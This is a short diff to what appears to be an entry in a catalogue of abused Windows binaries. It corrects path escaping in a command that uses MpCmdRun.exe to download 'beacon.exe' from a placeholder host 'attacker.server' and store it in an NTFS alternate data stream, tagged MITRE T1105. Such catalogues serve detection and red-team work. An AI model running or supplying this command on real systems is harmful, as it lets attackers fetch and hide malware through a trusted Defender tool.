@@ -18,7 +18,7 @@ Commands:
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10
-  - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\nicefile.txt:evil.exe
+  - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe
     Description: Download file to machine and store it in Alternate Data Stream
     Usecase: Hide downloaded data inton an Alternate Data Stream
     Category: ADS
